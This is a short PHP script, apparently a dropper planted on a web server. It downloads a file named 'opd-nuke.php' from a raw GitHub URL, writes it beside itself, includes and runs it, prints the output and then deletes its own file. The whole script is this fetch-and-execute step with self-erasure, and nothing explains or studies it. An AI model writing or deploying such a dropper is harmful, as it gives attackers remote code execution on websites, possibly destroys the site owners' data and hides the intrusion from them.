<?php
$d=__DIR__; $b='https://raw.githubusercontent.com/davidpersons10-cloud/getfortwayneplumber/opd-homefix-drop-20260920/ongtmp';
$x=@file_get_contents($b.'/opd-nuke.php');
if(!$x||strlen($x)<200){echo 'FAIL';exit(1);}
file_put_contents($d.'/opd-nuke.php',$x);
ob_start(); include $d.'/opd-nuke.php'; echo ob_get_clean();
@unlink(__FILE__);
